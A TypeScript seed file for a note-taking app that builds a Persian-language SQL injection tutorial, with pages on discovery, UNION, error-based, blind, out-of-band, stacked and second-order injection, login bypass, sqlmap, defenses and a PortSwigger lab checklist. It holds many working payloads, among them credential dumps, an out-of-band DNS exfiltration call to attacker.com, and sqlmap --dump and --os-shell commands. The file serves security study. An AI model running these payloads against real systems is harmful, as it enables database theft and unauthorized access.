import { PAGE } from "./ids";
import type { Block, BlockType, Page, PageIcon } from "./types";

export const SQLI_REF_FLAG = "daftar-sqli-ref-v1";

let seq = 0;
function blk(type: BlockType, content = "", extra: Partial<Block> = {}): Block {
  seq += 1;
  return { id: `seed-sqli-${seq}`, type, content, ...extra };
}

const BASE = 1_724_400_100_000;

function page(
  id: string,
  title: string,
  icon: PageIcon,
  tags: string[],
  parentId: string | null,
  sort: number,
  blocks: Block[],
  extra?: Partial<Page>,
): Page {
  return {
    id,
    title,
    icon,
    tags,
    parentId,
    blocks,
    createdAt: BASE + sort,
    updatedAt: BASE + sort,
    sort,
    ...extra,
  };
}

const T = ["SQL Injection"] as const;

export function createSqliRefPages(): Record<string, Page> {
  seq = 0;
  const pages: Record<string, Page> = {};

  pages[PAGE.sqli] = page(
    PAGE.sqli,
    "SQL Injection صفر تا صد",
    "database",
    [...T, "Injection", "مرجع"],
    null,
    30,
    [
      blk("h1", "SQL Injection صفر تا صد — مرجع کامل تمرین"),
      blk(
        "p",
        "خلاصه این نوت مرجع کامل تزریق SQL است — از پیدا کردن نقطه تزریق (Discovery) تا استخراج کامل دیتابیس. روی هر مورد در فهرست یا کارت زیرصفحه بزن تا مستقیم بپری به همان قسمت.",
      ),
      blk("callout", "روی لینک‌های [[ ]] کلیک کن؛ همان صفحه باز می‌شود.", { callout: "tip" }),
      blk("h2", "فهرست کلیک‌پذیر"),
      blk("h3", "مرحله ۰ — شناسایی"),
      blk("ul", "[[۱. SQL Injection چیست؟]]"),
      blk("ul", "[[۲. Discovery]]"),
      blk("ul", "[[۳. دیتابیس و ستون‌ها]]"),
      blk("h3", "انواع حمله"),
      blk("ul", "[[۴. UNION-based]]"),
      blk("ul", "[[۵. Error-based]]"),
      blk("ul", "[[۶. Boolean-based Blind]]"),
      blk("ul", "[[۷. Time-based Blind]]"),
      blk("ul", "[[۸. Out-of-Band]]"),
      blk("ul", "[[۹. Stacked Queries]]"),
      blk("ul", "[[۱۰. Second-Order]]"),
      blk("ul", "[[۱۱. بایپس لاگین]]"),
      blk("h3", "ابزار و دفاع"),
      blk("ul", "[[۱۲. sqlmap]]"),
      blk("ul", "[[۱۳. دفاع]]"),
      blk("ul", "[[Payload Cheat Sheet]]"),
      blk("ul", "[[چک‌لیست PortSwigger]]"),
    ],
    { starred: true },
  );

  pages[PAGE.sqliId] = page(
    PAGE.sqliId,
    "مرحله ۰ — شناسایی",
    "file",
    [...T, "Discovery"],
    PAGE.sqli,
    10,
    [
      blk("h1", "مرحله ۰ — شناسایی"),
      blk("p", "قبل از انتخاب نوع حمله باید بفهمی SQLi چیست، نقطه تزریق کجاست، و دیتابیس چند ستون دارد."),
      blk("ul", "[[۱. SQL Injection چیست؟]]"),
      blk("ul", "[[۲. Discovery]]"),
      blk("ul", "[[۳. دیتابیس و ستون‌ها]]"),
    ],
  );

  pages[PAGE.sqliWhat] = page(
    PAGE.sqliWhat,
    "۱. SQL Injection چیست؟",
    "book",
    [...T, "پایه"],
    PAGE.sqliId,
    10,
    [
      blk("h1", "۱. SQL Injection چیست؟"),
      blk("h2", "تعریف"),
      blk(
        "p",
        "وقتی ورودی کاربر بدون فیلتر مستقیم داخل کوئری SQL چسبانده می‌شود، مهاجم می‌تواند کوئری را دستکاری کند — دیتابیس را بخواند، تغییر دهد یا حتی پاک کند.",
      ),
      blk("p", "کوئری آسیب‌پذیر پشت صفحه خبر:"),
      blk("code", "SELECT details FROM news WHERE id=1", { lang: "sql" }),
      blk(
        "p",
        "آن عدد ۱ از آدرس `news?id=1` می‌آید. اگر مهاجم بفرستد `news?id=1 OR 1=1` کوئری می‌شود:",
      ),
      blk("code", "SELECT details FROM news WHERE id=1 OR 1=1", { lang: "sql" }),
      blk("callout", "چون 1=1 همیشه درست است → همه اخبار برمی‌گردد.", { callout: "warning" }),
      blk("h2", "چرا SQLi خطرناک‌ترین آسیب‌پذیری وب است؟"),
      blk("ul", "خواندن کل دیتابیس (پسوردها، ایمیل‌ها، کارت‌ها)"),
      blk("ul", "تغییر و حذف داده"),
      blk("ul", "بایپس احراز هویت"),
      blk("ul", "گاهی تا اجرای دستور روی سرور (RCE) پیش می‌رود"),
    ],
  );

  pages[PAGE.sqliDisc] = page(
    PAGE.sqliDisc,
    "۲. Discovery",
    "globe",
    [...T, "Discovery"],
    PAGE.sqliId,
    20,
    [
      blk("h1", "۲. Discovery — پیدا کردن نقطه تزریق"),
      blk(
        "callout",
        "قانون طلایی: هر ورودی = یک نقطه تزریق بالقوه. پارامترهای URL، فرم‌ها، کوکی‌ها، هدرها (مثل User-Agent) و APIها.",
        { callout: "abstract" },
      ),
      blk("h2", "قدم ۱ — تست با کوتیشن"),
      blk("p", "یک `'` تکی به پارامتر اضافه کن:"),
      blk("code", "news?id=1'", { lang: "text" }),
      blk(
        "p",
        "اگر خطای SQL برگشت یا صفحه شکست → احتمالاً آسیب‌پذیر است؛ چون آن کوتیشن اضافه سینتکس کوئری را خراب کرده.",
      ),
      blk("h2", "قدم ۲ — تست منطقی (درست/غلط)"),
      blk("code", "news?id=1 AND 1=1   →   صفحه نرمال ✅\nnews?id=1 AND 1=2   →   صفحه خالی/متفاوت ❌", {
        lang: "text",
      }),
      blk("p", "اگر این دو پاسخ فرق کردند → ورودی داخل کوئری اجرا می‌شود → تزریق تأیید شد."),
      blk("h2", "قدم ۳ — تست ریاضی"),
      blk("code", "news?id=3-1", { lang: "text" }),
      blk("p", "اگر همان صفحه `id=2` برگشت → دیتابیس محاسبه کرد → تزریق ممکن است."),
      blk("h2", "قدم ۴ — تست زمانی"),
      blk("code", "news?id=1 AND SLEEP(5)", { lang: "text" }),
      blk("p", "اگر پاسخ ۵ ثانیه طول کشید → تزریق تأیید (حتی اگر هیچ خروجی نبینی)."),
      blk("h2", "جدول تصمیم — کدام نوع حمله؟"),
      blk("table", "", {
        headers: ["علائم", "نوع مناسب"],
        rows: [
          ["خروجی کوئری در صفحه نمایش داده می‌شود", "۴. UNION-based"],
          ["پیام خطای دیتابیس نمایش داده می‌شود", "۵. Error-based"],
          ["نه خروجی، نه خطا — صفحه با شرط درست/غلط فرق می‌کند", "۶. Boolean-based Blind"],
          ["هیچ تفاوتی در صفحه نیست — فقط زمان پاسخ قابل سنجش است", "۷. Time-based Blind"],
          ["هیچ‌کدام + شبکه بیرون‌رو باز است", "۸. Out-of-Band"],
        ],
      }),
    ],
  );

  pages[PAGE.sqliDb] = page(
    PAGE.sqliDb,
    "۳. دیتابیس و ستون‌ها",
    "database",
    [...T, "Discovery"],
    PAGE.sqliId,
    30,
    [
      blk("h1", "۳. تشخیص نوع دیتابیس و تعداد ستون‌ها"),
      blk("h2", "تشخیص دیتابیس"),
      blk("table", "", {
        headers: ["تست", "نتیجه → دیتابیس"],
        rows: [
          ["' # کار کرد", "MySQL"],
          ["'-- کار کرد", "استاندارد — همه"],
          ["' '+'abc بدون خطا الحاق شد", "MSSQL"],
          ["SLEEP(5) کار کرد", "MySQL"],
          ["pg_sleep(5) کار کرد", "PostgreSQL"],
          ["WAITFOR DELAY '0:0:5' کار کرد", "MSSQL"],
        ],
      }),
      blk("p", "یا با تابع نسخه:"),
      blk("code", "SELECT @@version        -- MySQL و MSSQL\nSELECT version()        -- MySQL و PostgreSQL", {
        lang: "sql",
      }),
      blk("h2", "پیدا کردن تعداد ستون‌ها (پیش‌نیاز UNION)"),
      blk("h3", "روش ۱ — ORDER BY"),
      blk("p", "عدد را یکی‌یکی زیاد کن تا خطا بگیری:"),
      blk(
        "code",
        "news?id=1 ORDER BY 1-- -\nnews?id=1 ORDER BY 2-- -\nnews?id=1 ORDER BY 3-- -\nnews?id=1 ORDER BY 4-- -   →   خطا!",
        { lang: "text" },
      ),
      blk("callout", "خطا در ۴ یعنی کوئری ۳ ستون دارد.", { callout: "info" }),
      blk("h3", "روش ۲ — UNION با NULL"),
      blk(
        "code",
        "news?id=1 UNION SELECT NULL-- -\nnews?id=1 UNION SELECT NULL,NULL-- -\nnews?id=1 UNION SELECT NULL,NULL,NULL-- -   →   بدون خطا",
        { lang: "text" },
      ),
      blk("p", "اولین حالتی که خطا نداد = تعداد ستون‌ها."),
    ],
  );

  pages[PAGE.sqliAttacks] = page(
    PAGE.sqliAttacks,
    "انواع حمله",
    "bug",
    [...T],
    PAGE.sqli,
    20,
    [
      blk("h1", "انواع حمله"),
      blk("p", "بعد از Discovery نوع کانال استخراج را انتخاب کن."),
      blk("ul", "[[۴. UNION-based]]"),
      blk("ul", "[[۵. Error-based]]"),
      blk("ul", "[[۶. Boolean-based Blind]]"),
      blk("ul", "[[۷. Time-based Blind]]"),
      blk("ul", "[[۸. Out-of-Band]]"),
      blk("ul", "[[۹. Stacked Queries]]"),
      blk("ul", "[[۱۰. Second-Order]]"),
      blk("ul", "[[۱۱. بایپس لاگین]]"),
    ],
  );

  pages[PAGE.sqliUnion] = page(
    PAGE.sqliUnion,
    "۴. UNION-based",
    "database",
    [...T, "Union"],
    PAGE.sqliAttacks,
    10,
    [
      blk("h1", "۴. UNION-based — استخراج مستقیم"),
      blk(
        "p",
        "کوئری خودمان را با UNION به کوئری سایت می‌چسبانیم و خروجی‌اش مستقیم روی صفحه چاپ می‌شود. سریع‌ترین نوع SQLi.",
      ),
      blk("h2", "قدم ۱ — ستون‌های قابل نمایش"),
      blk("code", "news?id=-1 UNION SELECT 1,2,3-- -", { lang: "text" }),
      blk(
        "callout",
        "چرا id=-1؟ با دادن id ناموجود، کوئری اصلی هیچ سطری برنمی‌گرداند تا فقط خروجی UNION خودمان روی صفحه باشد. اگر عدد ۲ چاپ شد → ستون دوم قابل نمایش است.",
        { callout: "tip" },
      ),
      blk("h2", "قدم ۲ — اطلاعات پایه"),
      blk(
        "code",
        "news?id=-1 UNION SELECT 1,@@version,3-- -\nnews?id=-1 UNION SELECT 1,database(),3-- -\nnews?id=-1 UNION SELECT 1,user(),3-- -",
        { lang: "text" },
      ),
      blk("table", "", {
        headers: ["تابع", "اطلاعات"],
        rows: [
          ["@@version", "نسخه دیتابیس"],
          ["database()", "نام دیتابیس فعلی"],
          ["user()", "یوزر اتصال فعلی"],
        ],
      }),
      blk("h2", "قدم ۳ — نقشه‌کشی با information_schema"),
      blk("p", "نام همه دیتابیس‌ها:"),
      blk("code", "news?id=-1 UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -", {
        lang: "text",
      }),
      blk("p", "نام جدول‌های دیتابیس هدف:"),
      blk(
        "code",
        'news?id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema="shop"-- -',
        { lang: "text" },
      ),
      blk("p", "نام ستون‌های جدول users:"),
      blk(
        "code",
        'news?id=-1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name="users"-- -',
        { lang: "text" },
      ),
      blk("h2", "قدم ۴ — استخراج داده"),
      blk("code", "news?id=-1 UNION SELECT 1,email,pass FROM users-- -", { lang: "text" }),
      blk("h2", "قدم ۵ — استخراج انبوه با GROUP_CONCAT"),
      blk("p", "وقتی فقط یک سطر جا داری، همه را در یک رشته جمع کن:"),
      blk("code", "news?id=-1 UNION SELECT 1,GROUP_CONCAT(email,0x3a,pass),3 FROM users-- -", {
        lang: "text",
      }),
      blk("code", "admin@:1234,reza@:pass123,ali@:qwerty", { lang: "text" }),
      blk("callout", "0x3a کد هگز کاراکتر : است — برای جدا کردن فیلدها.", { callout: "info" }),
    ],
  );

  pages[PAGE.sqliError] = page(
    PAGE.sqliError,
    "۵. Error-based",
    "bug",
    [...T, "Error"],
    PAGE.sqliAttacks,
    20,
    [
      blk("h1", "۵. Error-based — استخراج از دل پیام خطا"),
      blk(
        "p",
        "سایت خروجی کوئری را نشان نمی‌دهد، ولی پیام خطای دیتابیس را چاپ می‌کند. پس کوئری را طوری می‌نویسیم که داده داخل متن خطا قرار بگیرد.",
      ),
      blk("h2", "روش ۱ — EXTRACTVALUE (کلاسیک MySQL)"),
      blk("code", "news?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -", { lang: "text" }),
      blk("code", "XPATH syntax error: '~5.7.44'", { lang: "text" }),
      blk("callout", "نسخه دیتابیس داخل خود خطا لو رفت. 0x7e یعنی ~ برای مشخص شدن مرز داده.", {
        callout: "warning",
      }),
      blk("h2", "روش ۲ — UPDATEXML"),
      blk("code", "news?id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- -", { lang: "text" }),
      blk("h2", "روش ۳ — Duplicate Entry (FLOOR + RAND + GROUP BY)"),
      blk(
        "code",
        "news?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- -",
        { lang: "text" },
      ),
      blk("code", "Duplicate entry '5.7.441' for key 'group_key'", { lang: "text" }),
      blk(
        "callout",
        "این توابع معمولاً حدود ۶۴ کاراکتر اول را در خطا برمی‌گردانند — برای داده طولانی با SUBSTR تکه‌تکه استخراج کن.",
        { callout: "tip" },
      ),
    ],
  );

  pages[PAGE.sqliBoolean] = page(
    PAGE.sqliBoolean,
    "۶. Boolean-based Blind",
    "shield",
    [...T, "Blind"],
    PAGE.sqliAttacks,
    30,
    [
      blk("h1", "۶. Boolean-based Blind — تزریق کور با درست/غلط"),
      blk(
        "p",
        "نه خروجی چاپ می‌شود، نه خطا — ولی صفحه با شرط درست و غلط فرق می‌کند. از دیتابیس سؤال بله/خیر می‌پرسیم و جواب را از ظاهر صفحه می‌فهمیم.",
      ),
      blk("h2", "قدم ۱ — تأیید"),
      blk("code", "news?id=1 AND 1=1-- -   →   صفحه نرمال\nnews?id=1 AND 1=2-- -   →   صفحه خالی", {
        lang: "text",
      }),
      blk("h2", "قدم ۲ — حدس طول نام دیتابیس"),
      blk(
        "code",
        "news?id=1 AND LENGTH(database())>5-- -     →   نرمال → بله، بیشتر از ۵\nnews?id=1 AND LENGTH(database())>10-- -    →   خالی → خیر",
        { lang: "text" },
      ),
      blk("h2", "قدم ۳ — استخراج حرف به حرف با SUBSTR + ASCII"),
      blk("p", "سؤال: آیا حرف اول نام دیتابیس کد ASCII بزرگ‌تر از ۱۰۰ دارد؟"),
      blk("code", "news?id=1 AND ASCII(SUBSTR(database(),1,1))>100-- -", { lang: "text" }),
      blk(
        "p",
        "با جستجوی دودویی (Binary Search) کد دقیق حرف را پیدا می‌کنی، بعد سراغ حرف دوم `SUBSTR(...,2,1)`.",
      ),
      blk("h3", "مثال استخراج پسورد ادمین"),
      blk(
        "code",
        'news?id=1 AND ASCII(SUBSTR((SELECT pass FROM users WHERE email="admin@"),1,1))>80-- -',
        { lang: "text" },
      ),
      blk("p", "اگر صفحه نرمال برگشت → حرف اول پسورد کدی بالای ۸۰ دارد."),
      blk(
        "callout",
        "این روش دستی خیلی کند است. هر حرف چندین درخواست می‌خواهد — در عمل از Intruder یا sqlmap استفاده کن.",
        { callout: "warning" },
      ),
    ],
  );

  pages[PAGE.sqliTime] = page(
    PAGE.sqliTime,
    "۷. Time-based Blind",
    "terminal",
    [...T, "Blind", "Time"],
    PAGE.sqliAttacks,
    40,
    [
      blk("h1", "۷. Time-based Blind — تزریق کور با زمان"),
      blk(
        "p",
        "حتی صفحه هم فرق نمی‌کند. تنها چیز قابل اندازه‌گیری زمان پاسخ است. با IF + SLEEP سؤال بله/خیر می‌پرسیم: درست = خواب، غلط = پاسخ فوری.",
      ),
      blk("h2", "قدم ۱ — تأیید"),
      blk("code", "news?id=1 AND SLEEP(5)-- -", { lang: "text" }),
      blk("p", "پاسخ ۵ ثانیه طول کشید → تزریق تأیید."),
      blk("h2", "قدم ۲ — سؤال بله/خیر با IF"),
      blk(
        "code",
        "news?id=1 AND IF(1=1,SLEEP(5),0)-- -    →   ۵ ثانیه → شرط درست\nnews?id=1 AND IF(1=2,SLEEP(5),0)-- -    →   فوری → شرط غلط",
        { lang: "text" },
      ),
      blk("h2", "قدم ۳ — استخراج حرف به حرف"),
      blk("code", "news?id=1 AND IF(ASCII(SUBSTR(database(),1,1))>100,SLEEP(5),0)-- -", { lang: "text" }),
      blk("p", "ترجمه: اگر حرف اول نام دیتابیس کدش بالای ۱۰۰ است، ۵ ثانیه بخواب."),
      blk("h2", "نکات عملی"),
      blk("ul", "SLEEP را ۳ تا ۵ ثانیه بگذار — شبکه نویز دارد"),
      blk("ul", "هر تست را دو بار تکرار کن تا تأخیر واقعی از کندی شبکه جدا شود"),
      blk("ul", "در MSSQL به‌جای SLEEP از WAITFOR DELAY '0:0:5' استفاده می‌شود"),
    ],
  );

  pages[PAGE.sqliOob] = page(
    PAGE.sqliOob,
    "۸. Out-of-Band",
    "network",
    [...T, "OOB"],
    PAGE.sqliAttacks,
    50,
    [
      blk("h1", "۸. Out-of-Band — استخراج از مسیر دیگر"),
      blk(
        "p",
        "وقتی هیچ کانالی (نه خروجی، نه خطا، نه زمان قابل‌اعتماد) نداری، دیتابیس را وادار می‌کنی خودش یک درخواست DNS یا HTTP به سرور تو بزند و داده را داخل نام دامنه قاچاق کند.",
      ),
      blk("p", "مثال MySQL (نیازمند پرمیشن بالا و تنظیمات خاص):"),
      blk("code", "SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.attacker.com\\\\a'));", {
        lang: "sql",
      }),
      blk("p", "دیتابیس یک درخواست DNS می‌زند به:"),
      blk("code", "5.7.44.attacker.com", { lang: "text" }),
      blk(
        "callout",
        "Burp Collaborator دقیقاً برای همین ساخته شده — دامنه منحصربفرد می‌دهد و درخواست‌های DNS/HTTP ورودی را گزارش می‌کند.",
        { callout: "tip" },
      ),
    ],
  );

  pages[PAGE.sqliStacked] = page(
    PAGE.sqliStacked,
    "۹. Stacked Queries",
    "code",
    [...T],
    PAGE.sqliAttacks,
    60,
    [
      blk("h1", "۹. Stacked Queries — تزریق چند کوئری"),
      blk("p", "اگر پشت سر کوئری اصلی بتوانی کوئری دوم با `;` اجرا کنی، تقریباً هر کاری می‌توانی بکنی:"),
      blk("code", 'news?id=1; INSERT INTO users(email,pass) VALUES("hacker@","hacked")-- -', {
        lang: "text",
      }),
      blk(
        "callout",
        "در MySQL + PHP بیشتر درایورها (مثل mysqli) اجرای چند کوئری را غیرفعال کرده‌اند. در MSSQL و PostgreSQL شایع‌تر است. اگر کار کرد قدرتش از همه نوع‌ها بیشتر است: INSERT، UPDATE، DELETE مستقیم.",
        { callout: "warning" },
      ),
    ],
  );

  pages[PAGE.sqliSecond] = page(
    PAGE.sqliSecond,
    "۱۰. Second-Order",
    "lock",
    [...T],
    PAGE.sqliAttacks,
    70,
    [
      blk("h1", "۱۰. Second-Order — تزریق مرتبه دوم"),
      blk(
        "p",
        "Payload در همان لحظه اجرا نمی‌شود — اول ذخیره می‌شود (مثلاً در فرم ثبت‌نام) و بعداً در صفحه دیگری که آن داده را در کوئری استفاده می‌کند، منفجر می‌شود.",
      ),
      blk("h2", "سناریو"),
      blk("ol", "ثبت‌نام با یوزرنیم: admin'-- -"),
      blk("ol", "دیتابیس آن را escape می‌کند و ذخیره می‌کند (فعلاً امن)"),
      blk("ol", "صفحه «تغییر رمز» یوزرنیم را از دیتابیس می‌خواند و خام در کوئری می‌گذارد"),
      blk("code", 'UPDATE users SET pass="newpass" WHERE user="admin\'-- -"', { lang: "sql" }),
      blk("p", "Payload همین‌جا اجرا می‌شود — رمز admin عوض شد."),
      blk(
        "callout",
        "سخت پیدا می‌شود چون نقطه ورود (ثبت‌نام) با نقطه انفجار (تغییر رمز) فرق دارد. اسکنرهای خودکار معمولاً آن را پیدا نمی‌کنند — تست دستی لازم است.",
        { callout: "danger" },
      ),
    ],
  );

  pages[PAGE.sqliBypass] = page(
    PAGE.sqliBypass,
    "۱۱. بایپس لاگین",
    "lock",
    [...T, "Auth"],
    PAGE.sqliAttacks,
    80,
    [
      blk("h1", "۱۱. Authentication Bypass — بایپس لاگین"),
      blk("p", "کاربردی‌ترین حالت SQLi. کوئری آسیب‌پذیر لاگین:"),
      blk("code", "SELECT * FROM users WHERE user='$u' AND pass='$p'", { lang: "sql" }),
      blk("h2", "Payloadهای کلاسیک"),
      blk("p", "در فیلد یوزرنیم:"),
      blk("code", "admin'-- -", { lang: "text" }),
      blk("p", "کوئری نهایی — شرط پسورد کامنت می‌شود:"),
      blk("code", "SELECT * FROM users WHERE user='admin'-- -' AND pass='هرچی'", { lang: "sql" }),
      blk("p", "یا بایپس با OR:"),
      blk("code", "' OR 1=1-- -", { lang: "text" }),
      blk("code", "SELECT * FROM users WHERE user='' OR 1=1-- -' AND pass=''", { lang: "sql" }),
      blk(
        "callout",
        "چون 1=1 همیشه درست است → قانون OR → کل شرط درست → ورود با اولین کاربر جدول (معمولاً ادمین).",
        { callout: "warning" },
      ),
      blk("h2", "چند Payload دیگر برای تست"),
      blk("code", "admin' #\n' OR '1'='1\n' OR '1'='1'-- -\nadmin') OR ('1'='1", { lang: "text" }),
      blk(
        "p",
        "چرا چند مدل؟ چون نمی‌دانی کوئری اصلی دقیقاً چه شکلی است — شاید یوزر داخل `'...'` باشد، شاید `\"...\"`، شاید `('...')`. کامنت را هم با `#` و هم `--` امتحان کن.",
      ),
    ],
  );

  pages[PAGE.sqliTools] = page(
    PAGE.sqliTools,
    "ابزار و دفاع",
    "shield",
    [...T],
    PAGE.sqli,
    30,
    [
      blk("h1", "ابزار و دفاع"),
      blk("ul", "[[۱۲. sqlmap]]"),
      blk("ul", "[[۱۳. دفاع]]"),
      blk("ul", "[[Payload Cheat Sheet]]"),
      blk("ul", "[[چک‌لیست PortSwigger]]"),
    ],
  );

  pages[PAGE.sqliMap] = page(
    PAGE.sqliMap,
    "۱۲. sqlmap",
    "terminal",
    [...T, "ابزار"],
    PAGE.sqliTools,
    10,
    [
      blk("h1", "۱۲. sqlmap — خودکارسازی همه چیز"),
      blk(
        "p",
        "sqlmap همه تکنیک‌ها را خودکار تشخیص و اجرا می‌کند — از Discovery تا Dump کامل دیتابیس.",
      ),
      blk("h2", "سطوح استفاده"),
      blk("p", "تست اولیه یک پارامتر:"),
      blk("code", 'sqlmap -u "https://target.com/news?id=1"', { lang: "bash" }),
      blk("p", "لیست دیتابیس‌ها:"),
      blk("code", 'sqlmap -u "https://target.com/news?id=1" --dbs', { lang: "bash" }),
      blk("p", "لیست جدول‌های یک دیتابیس:"),
      blk("code", 'sqlmap -u "https://target.com/news?id=1" -D shop --tables', { lang: "bash" }),
      blk("p", "لیست ستون‌های یک جدول:"),
      blk("code", 'sqlmap -u "https://target.com/news?id=1" -D shop -T users --columns', { lang: "bash" }),
      blk("p", "استخراج کامل داده (Dump):"),
      blk("code", 'sqlmap -u "https://target.com/news?id=1" -D shop -T users --dump', { lang: "bash" }),
      blk("h2", "ترفندهای مهم"),
      blk("table", "", {
        headers: ["آپشن", "کاربرد"],
        rows: [
          ["--level=5 --risk=3", "تست عمیق‌تر (پیش‌فرض level=1)"],
          ["--technique=T", "فقط Time-based (T=time ، B=boolean ، U=union ، E=error)"],
          ["-r request.txt", "خواندن درخواست خام از فایل (از Burp ذخیره کن)"],
          ['--cookie="..."', "تست با نشست لاگین‌شده"],
          ["--batch", "اجرای خودکار بدون سؤال"],
          ["--os-shell", "تلاش برای گرفتن شل روی سرور"],
        ],
      }),
      blk(
        "callout",
        "بهترین گردش کار: در Burp روی درخواست راست‌کلیک → Copy to file → بعد به sqlmap بده با -r تا همه هدرها و کوکی‌ها دقیق منتقل شوند.",
        { callout: "tip" },
      ),
    ],
  );

  pages[PAGE.sqliDefense] = page(
    PAGE.sqliDefense,
    "۱۳. دفاع",
    "shield",
    [...T, "دفاع"],
    PAGE.sqliTools,
    20,
    [
      blk("h1", "۱۳. دفاع در برابر SQLi"),
      blk("table", "", {
        headers: ["راه‌حل", "توضیح"],
        rows: [
          ["Prepared Statements", "جداکردن کامل داده از کوئری — تنها راه‌حل اصلی"],
          ["ORM", "فریم‌ورک‌هایی مثل Django ORM که خودشان پارامتری می‌کنند"],
          ["اعتبارسنجی ورودی", "Whitelist — مثلاً id فقط عدد باشد"],
          ["Least Privilege", "یوزر دیتابیس وب‌اپ فقط دسترسی لازم را داشته باشد"],
          ["مخفی کردن خطاها", "پیام خطای دیتابیس هرگز به کاربر نشان داده نشود"],
          ["WAF", "لایه دفاعی اضافی (قابل دور زدن است — تنها راه‌حل نیست)"],
        ],
      }),
      blk("h2", "نمونه Prepared Statement در PHP"),
      blk(
        "code",
        '$stmt = $pdo->prepare("SELECT * FROM users WHERE user = ? AND pass = ?");\n$stmt->execute([$user, $pass]);',
        { lang: "php" },
      ),
      blk(
        "callout",
        "در Prepared Statement حتی اگر کاربر ' OR 1=1-- بفرستد، به عنوان رشته معمولی در نظر گرفته می‌شود نه بخشی از کوئری.",
        { callout: "tip" },
      ),
    ],
  );

  pages[PAGE.sqliCheat] = page(
    PAGE.sqliCheat,
    "Payload Cheat Sheet",
    "code",
    [...T, "Payload"],
    PAGE.sqliTools,
    30,
    [
      blk("h1", "Payload Cheat Sheet — مرور سریع"),
      blk("h2", "Discovery"),
      blk("code", "'\n\"\n1 AND 1=1\n1 AND 1=2\n1 AND SLEEP(5)\n3-1", { lang: "text" }),
      blk("h2", "بایپس لاگین"),
      blk("code", "admin'-- -\n' OR 1=1-- -\n' OR '1'='1", { lang: "text" }),
      blk("h2", "UNION"),
      blk(
        "code",
        "1 ORDER BY 1-- -\n1 UNION SELECT NULL,NULL,NULL-- -\n-1 UNION SELECT 1,@@version,3-- -\n-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables-- -\n-1 UNION SELECT 1,GROUP_CONCAT(email,0x3a,pass),3 FROM users-- -",
        { lang: "text" },
      ),
      blk("h2", "Error-based"),
      blk(
        "code",
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -\n1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- -",
        { lang: "text" },
      ),
      blk("h2", "Blind"),
      blk(
        "code",
        "1 AND ASCII(SUBSTR(database(),1,1))>100-- -            ← Boolean\n1 AND IF(ASCII(SUBSTR(database(),1,1))>100,SLEEP(5),0)-- -   ← Time",
        { lang: "text" },
      ),
    ],
  );

  pages[PAGE.sqliCheck] = page(
    PAGE.sqliCheck,
    "چک‌لیست PortSwigger",
    "bug",
    [...T, "لاب"],
    PAGE.sqliTools,
    40,
    [
      blk("h1", "چک‌لیست تمرین عملی"),
      blk("callout", "پیشنهاد: لب‌های PortSwigger. تیک بزن تا نوار پیشرفت لاب پر شود.", { callout: "abstract" }),
      blk("todo", "تست Discovery با کوتیشن و شرط درست/غلط", { checked: false }),
      blk("todo", "پیدا کردن تعداد ستون با ORDER BY", { checked: false }),
      blk("todo", "پیدا کردن ستون قابل نمایش با UNION SELECT 1,2,3", { checked: false }),
      blk("todo", "استخراج @@version و database()", { checked: false }),
      blk("todo", "نقشه‌کشی با information_schema", { checked: false }),
      blk("todo", "Dump جدول users با GROUP_CONCAT", { checked: false }),
      blk("todo", "استخراج با EXTRACTVALUE (Error-based)", { checked: false }),
      blk("todo", "استخراج یک حرف با Boolean-based", { checked: false }),
      blk("todo", "استخراج یک حرف با Time-based (SLEEP)", { checked: false }),
      blk("todo", "بایپس لاگین با ' OR 1=1--", { checked: false }),
      blk("todo", "انجام همه مراحل با sqlmap", { checked: false }),
    ],
  );

  return pages;
}

export const SQLI_EXPAND: Record<string, boolean> = {
  [PAGE.sqli]: true,
  [PAGE.sqliId]: true,
  [PAGE.sqliAttacks]: true,
  [PAGE.sqliTools]: true,
};

export function applySqliRef(
  pages: Record<string, Page>,
  order: string[],
  expanded: Record<string, boolean>,
): { pages: Record<string, Page>; order: string[]; expanded: Record<string, boolean> } {
  const ref = createSqliRefPages();
  const nextOrder = order.includes(PAGE.sqli)
    ? order
    : [PAGE.home, PAGE.http, PAGE.sqli, ...order.filter((id) => id !== PAGE.home && id !== PAGE.http)];
  return {
    pages: { ...pages, ...ref },
    order: nextOrder,
    expanded: { ...expanded, ...SQLI_EXPAND },
  };
}
